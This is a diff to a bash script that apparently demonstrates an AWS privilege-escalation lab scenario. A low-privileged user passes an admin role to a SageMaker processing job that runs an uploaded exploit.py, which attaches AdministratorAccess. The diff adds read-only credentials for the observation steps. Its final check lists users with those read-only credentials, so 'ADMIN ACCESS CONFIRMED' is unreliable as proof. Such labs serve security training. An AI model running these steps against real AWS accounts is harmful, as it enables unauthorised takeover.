@@ -69,6 +69,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -79,6 +88,7 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo "Bucket: $BUCKET_NAME"
 echo "Passable Role: $PASSABLE_ROLE_ARN"
@@ -87,16 +97,25 @@ echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
-# Verify starting user identity
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
@@ -107,15 +126,17 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -125,7 +146,7 @@ else
 fi
 echo ""
 
-# Step 5: Create malicious processing script
+# [EXPLOIT] Step 5: Create malicious processing script
 echo -e "${YELLOW}Step 5: Creating malicious processing script${NC}"
 echo "Creating exploit.py that grants admin access to starting user..."
 
@@ -168,17 +189,18 @@ EOF
 
 echo -e "${GREEN}✓ Created malicious processing script${NC}\n"
 
-# Step 6: Upload script to S3
+# [EXPLOIT] Step 6: Upload script to S3
 echo -e "${YELLOW}Step 6: Uploading malicious script to S3${NC}"
 echo "Uploading exploit.py to s3://$BUCKET_NAME/scripts/exploit.py"
-
+use_starting_creds
 show_cmd "Attacker" "aws s3 cp /tmp/exploit.py s3://$BUCKET_NAME/scripts/exploit.py"
 aws s3 cp /tmp/exploit.py s3://$BUCKET_NAME/scripts/exploit.py
 
 echo -e "${GREEN}✓ Uploaded script to S3${NC}\n"
 
-# Step 7: Create SageMaker processing job with admin role
+# [EXPLOIT] Step 7: Create SageMaker processing job with admin role
 echo -e "${YELLOW}Step 7: Creating SageMaker processing job with admin role${NC}"
+use_starting_creds
 echo "Processing job name: $PROCESSING_JOB_NAME"
 echo "Using role: $PASSABLE_ROLE_ARN"
 echo ""
@@ -234,11 +256,12 @@ aws sagemaker create-processing-job \
 
 echo -e "${GREEN}✓ Created processing job${NC}\n"
 
-# Step 8: Wait for processing job to complete
+# [OBSERVATION] Step 8: Wait for processing job to complete
 echo -e "${YELLOW}Step 8: Waiting for processing job to complete${NC}"
 echo "This may take 3-5 minutes as the container starts and executes the script..."
 echo "You can monitor progress in the AWS Console: SageMaker → Processing jobs"
 echo ""
+use_readonly_creds
 
 # Wait for the job to complete (with timeout)
 MAX_WAIT_SECONDS=600  # 10 minutes
@@ -246,6 +269,7 @@ WAIT_INTERVAL=15
 ELAPSED_SECONDS=0
 
 while [ $ELAPSED_SECONDS -lt $MAX_WAIT_SECONDS ]; do
+    show_cmd "ReadOnly" "aws sagemaker describe-processing-job --region $AWS_REGION --processing-job-name $PROCESSING_JOB_NAME --query 'ProcessingJobStatus' --output text"
     JOB_STATUS=$(aws sagemaker describe-processing-job \
         --region $AWS_REGION \
         --processing-job-name $PROCESSING_JOB_NAME \
@@ -282,18 +306,29 @@ echo "Waiting 15 seconds for IAM changes to take effect..."
 sleep 15
 echo -e "${GREEN}✓ IAM changes propagated${NC}\n"
 
-# Step 10: Verify admin access
+# [OBSERVATION] Step 10: Verify admin access
 echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
-echo "Attempting to list IAM users with our original credentials..."
+echo "Checking if AdministratorAccess is now attached to starting user..."
 echo ""
-
-# Re-export credentials to ensure they're still set
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_readonly_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
-show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
+show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name \"$STARTING_USER\" --query 'AttachedPolicies[*].PolicyArn' --output text"
+ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
+    --user-name "$STARTING_USER" \
+    --query 'AttachedPolicies[*].PolicyArn' \
+    --output text 2>/dev/null)
+
+if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
+    echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_USER${NC}"
+else
+    echo -e "${RED}✗ AdministratorAccess policy not found on $STARTING_USER${NC}"
+    exit 1
+fi
+echo ""
+echo "Attempting to list IAM users..."
+
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
